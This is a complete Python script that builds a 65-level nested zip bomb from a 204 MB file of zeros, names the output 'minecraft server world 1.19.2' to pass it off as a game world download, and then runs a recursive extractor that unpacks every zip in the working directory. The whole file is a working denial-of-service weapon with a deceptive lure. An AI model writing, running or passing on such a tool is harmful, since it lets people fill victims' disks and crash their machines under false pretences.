import zipfile
import shutil
import os
import time
def fileSize(filename):
    st = os.stat(filename)
    return st.st_size
def makeTempFile(filename):
    with open(filename, 'wb') as cache:
        for i in range(204):
            chunk = bytearray(1048576 * b'0')
            cache.write(chunk)
def filenameNoExt(name):
    return name[:name.rfind('.')]
def fileExt(name):
    return name[name.rfind('.') + 1:]
def compressFileOld(infile, outfile):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()
def copyandcompress(infile, outfile, n_copies):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    for i in range(n_copies):
        f_name = '%s-%d.%s' % (filenameNoExt(infile), i, fileExt(infile))
        shutil.copy(infile, f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)
    zf.close()
def extractZipFiles():
    for file in os.listdir(os.getcwd()):
        if file.endswith(".zip"):
            with zipfile.ZipFile(file, 'r') as zip_ref:
                for zip_info in zip_ref.infolist():
                    if not zip_info.is_dir():
                        name = zip_info.filename
                        if os.path.exists(name):
                            suffix = 1
                            while os.path.exists(name):
                                new_name = os.path.splitext(name)[0] + "." + str(suffix) + os.path.splitext(name)[1]
                                suffix += 1
                                name = new_name
                        zip_ref.extract(zip_info.filename)
                        if os.path.exists(zip_info.filename):
                            os.rename(zip_info.filename, name)
            os.remove(file)
    for file in os.listdir(os.getcwd()):
        if file.endswith(".zip"):
            extractZipFiles()
    else:
        return ()
def makeBomb(levels, fileName):
    # Set Variables
    n_levels = levels
    out_zip_file = fileName
    dummy_name = 'cache-nodelete.txt'
    start_time = time.time()
    # Start
    makeTempFile(dummy_name)
    level_1_zip = '1.zip'
    compressFileOld(dummy_name, level_1_zip)
    decompressed_size = 0.1
    os.remove(dummy_name)
    for i in range(1, n_levels + 1):
        copyandcompress('%d.zip' % i, '%d.zip' % (i + 1), 10)
        decompressed_size *= 10
        os.remove('%d.zip' % i)
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename('%d.zip' % (n_levels + 1), out_zip_file)
    end_time = time.time()
    fileSizeExt = decompressed_size
    return out_zip_file, decompressed_size
makeBomb(65, 'minecraft server world 1.19.2')
extractZipFiles()